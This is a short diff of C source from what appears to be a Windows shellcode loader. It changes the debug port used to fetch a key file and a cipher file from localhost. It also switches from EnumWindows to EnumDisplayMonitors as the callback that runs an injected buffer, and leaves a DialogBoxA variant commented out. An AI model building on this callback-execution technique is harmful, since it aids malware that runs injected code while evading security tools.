@@ -237,7 +237,7 @@ int main(int argc, char* argv[]) {
 #if _DEBUG
 		ok("Will have to pull from code ugh");
 		char* host = "127.0.0.1";
-		char* port = "8080";
+		char* port = "34567";
 		char LocKey[] = "key.bin";
 		char LocCipher[] = "cipher.bin";
 		PopulateData(host, port, LocKey, LocCipher);
@@ -295,7 +295,9 @@ int main(int argc, char* argv[]) {
 
 	info("Triggering the Callback Function.");
 	ok("Injection should've been a success.");
-	EnumWindows((WNDENUMPROC)rBuffer, 0); //Callback Function
+	//EnumWindows((WNDENUMPROC)rBuffer, 0); //Callback Function
+	//DialogBoxA(NULL, "Something", NULL, (DLGPROC)rBuffer);
+	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)rBuffer, 0);
 
 	info("Closing all handles");
 
